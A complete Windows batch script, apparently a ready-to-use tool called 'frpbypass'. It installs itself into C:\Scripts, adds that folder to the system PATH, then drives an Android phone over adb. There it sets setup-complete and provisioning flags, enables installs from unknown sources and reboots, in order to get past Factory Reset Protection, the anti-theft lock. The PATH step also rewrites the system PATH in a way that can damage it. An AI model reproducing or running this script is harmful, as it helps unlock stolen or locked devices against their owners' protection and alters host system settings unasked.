@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM ===============================
REM INSTALLATION SECTION
REM ===============================
SET TARGET=C:\Scripts

REM Create folder if missing
IF NOT EXIST "%TARGET%" (
    mkdir "%TARGET%"
    echo Created %TARGET%
)

REM Copy this script into the target folder
copy "%~f0" "%TARGET%\frpbypass.bat" >nul
echo Installed frpbypass.bat into %TARGET%

REM Add folder to PATH if not already there
echo %PATH% | find /i "%TARGET%" >nul
IF ERRORLEVEL 1 (
    echo Adding %TARGET% to PATH...
    setx /M PATH "%PATH%;%TARGET%"
) ELSE (
    echo %TARGET% is already in PATH.
)

echo.
echo Installation complete.
echo You can now run: frpbypass
echo.

REM ===============================
REM RUN ONCE AFTER INSTALL
REM ===============================
echo Running frpbypass now...
call :RUN
exit /b

REM ===============================
REM MAIN SCRIPT (frpbypass logic)
REM ===============================
:RUN
echo Checking device...
FOR /F "skip=1 tokens=1,2" %%A IN ('adb devices') DO (
    IF "%%B"=="device" SET DEVICE_CONNECTED=1
)

IF NOT DEFINED DEVICE_CONNECTED (
    echo No device found. Please connect your device and enable USB debugging.
    pause
    exit /b
)

echo Device found. Applying tweaks...

adb shell settings put global setup_wizard_has_run 1
adb shell settings put secure user_setup_complete 1
adb shell settings put global device_provisioned 1
adb shell settings put secure install_non_market_apps 1

adb shell am start -c android.intent.category.HOME -a android.intent.action.MAIN
timeout /t 5 /nobreak
adb shell am start -n com.android.settings/.Settings
timeout /t 5 /nobreak

echo Rebooting device...
adb reboot

echo All done! The device is rebooting.
pause

